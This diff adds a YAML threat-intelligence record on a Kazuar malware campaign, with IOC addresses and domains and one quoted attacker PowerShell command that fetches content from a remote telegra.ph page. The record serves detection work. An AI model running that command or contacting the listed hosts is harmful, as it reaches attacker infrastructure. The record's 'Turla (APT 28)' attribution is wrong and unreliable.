@@ -1,0 +1,45 @@
+description: "A campaign using a compromised WordPress site as C&C for the Kazuar\
+  \ malware, leveraging PowerShell scripts, DLL side\u2011loading, and encrypted communication."
+attribution: Turla (APT 28)
+malware_families:
+- Kazuar
+TTPs:
+  processes:
+  - powershell
+  - vncutil64.exe
+  - LaunchGFExperience.exe
+  commandline: []
+  powershell:
+  - $getPage =Invoke-WebRequest -Uri "https://api.telegral.]ph/getPage/SecurityHealthSystray-01-20?return_content=true"
+    -UseBasicParsing;sleep 15;
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity: []
+  persistence: []
+  process_relations: []
+IOCs:
+  ip_addresses:
+  - 91.231.182.187
+  - 185.118.115.15
+  - 77.46.148.242
+  - 168.119.152.19
+  - 217.160.0.33
+  - 217.160.0.159
+  domains:
+  - ekrn.ydns.eu
+  - fjsconsultoria.com
+  - ingas.rs
+  - abrargeospatial.ir
+  - brannenburg-er-nagelfluh.de
+  - pizzeria-mercy.de
+  - eset.ydns.eu
+  urls:
+  - https://api.telegral.]ph/getPage/SecurityHealthSystray-01-20?return_content=true
+authors:
+- Matthieu Faou
+- Zoltán Rusnák
+reference: https://www.welivesecurity.com/en/eset-research/gamaredon-x-turla-collab
+date_of_publication: January 20, 2025
+file_creation_date: October 01, 2025
